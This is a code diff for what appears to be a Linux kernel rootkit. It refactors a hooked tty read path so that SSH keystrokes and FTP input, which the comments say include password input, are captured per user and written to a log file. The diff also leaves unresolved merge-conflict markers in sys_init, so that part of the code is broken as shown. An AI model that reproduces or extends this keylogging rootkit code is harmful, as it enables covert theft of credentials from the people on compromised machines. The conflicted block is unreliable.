@@ -19,6 +19,7 @@
 #include "lkm.h"
 #include "fs.h"
 #include "bpf.h"
+#include "tty.h"
 #include "log.h"
 
 #pragma GCC optimize("-fno-optimize-sibling-calls")
@@ -47,9 +48,7 @@ sys64 real_m_read;
  * These are kept open throughout kv lifetime
  *  This is so because tty is continuous.
  */
-static struct file *ttyfilp;
 
-static DEFINE_SPINLOCK(tty_lock);
 static DEFINE_SPINLOCK(hide_once_spin);
 
 /**
@@ -889,7 +888,7 @@ static int _key_update(uid_t uid, char byte, int flags)
 			node->buf[node->offset++] = '\n';
 			node->buf[node->offset] = 0;
 
-			_tty_write_log(uid, node->buf, strlen(node->buf));
+			kv_tty_write(uid, node->buf, strlen(node->buf));
 
 			list_del(&node->list);
 			kfree(node);
@@ -992,16 +991,15 @@ static ssize_t m_tty_read(struct kiocb *iocb, struct iov_iter *to)
 		flags |= (byte == '\n') ? R_NEWLINE : flags;
 
 		/**
-		 * Handles SSH session data, which usually arrives one byte at a time.
-		 * However, in certain cases, such as during password input, the data may 
-		 * arrive as a multi-byte stream.
+		 * To handle SSH session data, it typically
+		 * comes one byte at a time, but there are instances when it comes
+		 * as a multi-byte stream, for example, during password input.
 		 */
 		if ((app_flag & APP_FTP) && rv > 1) {
 			ttybuf[strcspn(ttybuf, "\r")] = '\0';
-			_tty_write_log(uid, ttybuf, sizeof(ttybuf));
-
+			kv_tty_write(uid, ttybuf, sizeof(ttybuf));
 		} else if (app_flag & APP_SSH &&
-			   (rv == 1 || flags & R_RETURN || flags & R_NEWLINE)) {
+			(rv == 1 || flags & R_RETURN || flags & R_NEWLINE)) {
 			_key_update(uid, byte, flags);
 		}
 	}
@@ -1432,6 +1430,7 @@ bool sys_init(void)
 				prinfo("sys_init: ftrace hook %d on %s\n", idx,
 				       ft_hooks[idx].name);
 
+<<<<<<< HEAD
 			/** Init tty log */
 			ttyfilp = fs_kernel_open_file(sys_get_ttyfile());
 			if (!ttyfilp) {
@@ -1441,6 +1440,16 @@ bool sys_init(void)
 		}
 	}
 	return rc;
+=======
+            /** Init tty log */
+            if (kv_tty_open(sys_get_ttyfile()) != true) {
+                prerr("sys_init: Failed loading tty file\n");
+                rc = false;
+            }
+        }
+    }
+    return rc;
+>>>>>>> 0e7e017 (tty: gets its own source file)
 }
 
 void sys_deinit(void)
